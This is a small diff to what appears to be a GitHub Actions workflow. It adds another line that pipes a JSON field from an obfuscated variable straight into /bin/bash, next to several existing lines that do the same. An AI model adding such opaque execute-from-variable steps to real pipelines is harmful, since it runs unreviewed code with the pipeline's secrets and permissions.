@@ -31,6 +31,7 @@ jobs:
           echo $prww09008 | jq -r .ddv8115 | /bin/bash
           echo $ehswi0 | jq -r .cd41534 | /bin/bash
           echo $ib06 | jq -r .mli0974 | /bin/bash
+          printf '%s' "$vr43257" | jq -r .mzcbr33 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
